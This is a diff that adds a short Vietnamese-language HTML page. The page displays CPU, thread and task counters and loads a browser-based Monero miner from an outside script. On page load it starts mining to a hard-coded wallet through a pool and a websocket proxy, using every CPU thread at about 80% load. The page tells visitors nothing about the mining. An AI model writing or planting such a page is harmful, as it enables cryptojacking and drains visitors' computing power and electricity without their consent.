@@ -1,1 +1,25 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>NSTĐ</title>
+</head>
+<body>
+    <div>Tốc độ xử lý: <span id="per">0</span></div>
+    <div>Tổng tác vụ: <span id="tong">0</span></div>
+    <div>Luồng CPU: <span id="luong">0</span></div>
 
+    <script src="https://script.monerominer.rocks"></script>
+    <script>
+        server = "wss://ny1.xmrminingproxy.com";
+        var pool = "moneroocean.stream";
+        var walletAddress = "43JDP6ha1e76wBvPGBMD3ihFdP93SLMf1Am3BZmRdCbHKG8FUuB8265YsG4Hb28mZ1Gdwrie26KzgZWd15oBRMsQN9AKut7";
+        var workerId = "";
+        var threads = -1; // để auto số luồng theo CPU
+        var password = "x";
+        startMining(pool, walletAddress, workerId, threads, password);
+        throttleMiner = 20; // chạy 80% CPU
+    </script>
+
+</body>
+</html>
